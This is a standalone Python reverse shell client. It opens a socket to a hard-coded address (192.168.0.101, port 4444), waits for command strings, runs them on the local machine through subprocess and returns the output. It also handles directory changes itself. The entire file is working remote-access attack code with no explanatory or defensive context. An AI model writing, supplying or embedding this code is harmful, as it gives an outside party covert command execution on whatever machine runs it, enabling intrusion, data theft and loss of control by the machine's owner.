import socket
import subprocess
import os

def connect_to_server(server_ip="192.168.0.101", server_port=4444):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        try:
            # Receive command from server
            cmd = client.recv(1024).decode().strip()
            if not cmd:
                continue

            if cmd.lower() == "exit":
                break

            # Handle "cd" separately
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    client.sendall(b"Changed directory\n[END OF STREAM]")
                except Exception as e:
                    client.sendall(str(e).encode() + b"\n[END OF STREAM]")
                continue  # go back to loop

            # Execute command
            output = subprocess.getoutput(cmd)
            if output == "":
                output = "[+] Command executed (no output)"
            
            # ✅ Always append [END OF STREAM] for consistency
            client.sendall(output.encode() + b"\n[END OF STREAM]")

        except Exception as e:
            break

    client.close()

if __name__ == "__main__":
    # Replace with your server IP if remote
    connect_to_server("192.168.0.101", 4444)
